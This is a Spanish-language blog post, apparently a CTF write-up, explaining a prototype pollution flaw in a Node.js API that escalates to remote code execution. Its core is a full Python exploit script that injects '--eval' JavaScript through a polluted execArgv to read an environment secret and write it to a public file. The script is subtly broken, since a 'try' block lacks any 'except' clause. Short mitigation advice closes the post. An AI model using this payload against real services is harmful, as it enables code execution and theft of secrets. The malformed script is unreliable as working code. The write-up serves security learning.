---
title: "Fluid Attacks CTF 2026: Web - Prototype Pollution RCE"
date: 2026-02-01
description: "Análisis profundo de una vulnerabilidad de Prototype Pollution en Node.js que derivó en RCE."
tags: ["CTF", "Web", "Prototype Pollution", "Node.js", "RCE"]
image: "/images/blog/fluid-web.png"
---

## 🎯 Objetivo

El desafío consistía en comprometer una API Rest escrita en **Node.js** que procesaba objetos JSON de manera insegura. El objetivo final era lograr **Ejecución Remota de Código (RCE)** para leer la flag del sistema de archivos.

## 🔍 Análisis de Vulnerabilidad

Al inspeccionar el comportamiento de la API, notamos que permitía la fusión recursiva de objetos JSON sin validar las claves. Esto es una señal clásica de **Prototype Pollution**.

Si un atacante envía un JSON con la clave `__proto__`, puede modificar el prototipo base `Object.prototype`, inyectando propiedades que estarán presentes en *todos* los objetos de la aplicación.

### El Vector de Ataque

La aplicación utilizaba `child_process.fork()` o similar para ejecutar tareas en segundo plano. En Node.js, las opciones de spawn/fork se heredan del prototipo si no están definidas explícitamente.

Específicamente, podemos contaminar `execArgv`, una propiedad que Node.js usa para pasar argumentos al binario `node` cuando se crea un proceso hijo.

```json
"__proto__": {
    "execArgv": [
        "--eval=..."
    ]
}
```

## 💥 Explotación

Diseñamos un exploit que inyecta un payload en `execArgv` para ejecutar código arbitrario antes de que inicie el script principal del proceso hijo.

### 1. Construcción del Payload

El payload debe ser JavaScript válido que se ejecute en el contexto del servidor. Nuestro objetivo es escribir la flag (almacenada en `process.env.FLAG`) en un archivo accesible públicamente.

### Full Exploit Script (`solve.py`)

```python
import requests
import time

# --- CONFIGURACIÓN ---
TARGET_URL = "https://54a511e6348b2e2d.chal.ctf.ae"
FILENAME = "hack.txt"

def exploit():
    print(f"[*] Objetivo: {TARGET_URL}")
    print("[*] Modo: NO INTERNET (Escribir flag en archivo público)")

    # PAYLOAD DE NODE.JS
    # 1. fs: Librería de archivos.
    # 2. process.env.FLAG: La bandera.
    # 3. writeFileSync: Escribe el archivo.
    # Intentamos escribir en la raíz './public/' y en './' por si acaso.
    
    js_payload = (
        f"const fs = require('fs');"
        f"const f = process.env.FLAG || 'NO_FLAG';"
        f"try {{ fs.writeFileSync('./public/{FILENAME}', f); }} catch(e) {{}}"
        f"try {{ fs.writeFileSync('./src/public/{FILENAME}', f); }} catch(e) {{}}"
        f"try {{ fs.writeFileSync('./static/{FILENAME}', f); }} catch(e) {{}}"
    )

    # Inyección JSON (Prototype Pollution)
    data = {
        "config": {
            "__proto__": {
                "execArgv": [
                    f"--eval={js_payload}"
                ]
            }
        }
    }

    headers = {"Content-Type": "application/json"}
    
    print("[*] Enviando inyección...")
    try:
        # 1. Enviar el exploit para crear el archivo
        requests.post(f"{TARGET_URL.rstrip('/')}/api/contact", json=data, headers=headers, timeout=10)
        
        print("[*] Esperando 2 segundos para que se escriba el archivo...")
        time.sleep(2)

        # 2. Intentar descargar el archivo creado
        file_url = f"{TARGET_URL.rstrip('/')}/{FILENAME}"
        print(f"[*] Buscando la bandera en: {file_url}")
        
        r = requests.get(file_url)
        
        if r.status_code == 200:
            print("\n" + "="*40)
            print(f"¡¡¡VICTORIA!!! LA FLAG ES:")
            print(f"{r.text.strip()}")
            print("="*40 + "\n")
        else:
            print(f"[-] Falló. El archivo no aparece (Status: {r.status_code}).")
            print("Posible causa: La carpeta 'public' tiene otro nombre o no tenemos permisos.")

if __name__ == "__main__":
    exploit()
```

## 🛡️ Mitigación

Para prevenir Prototype Pollution:
1.  Usar `Object.freeze(Object.prototype)` al inicio de la aplicación.
2.  Validar y sanear recursivamente las claves JSON, bloqueando `__proto__`, `constructor` y `prototype`.
3.  Usar librerías seguras para mergeo de objetos o `Map` en lugar de objetos planos.
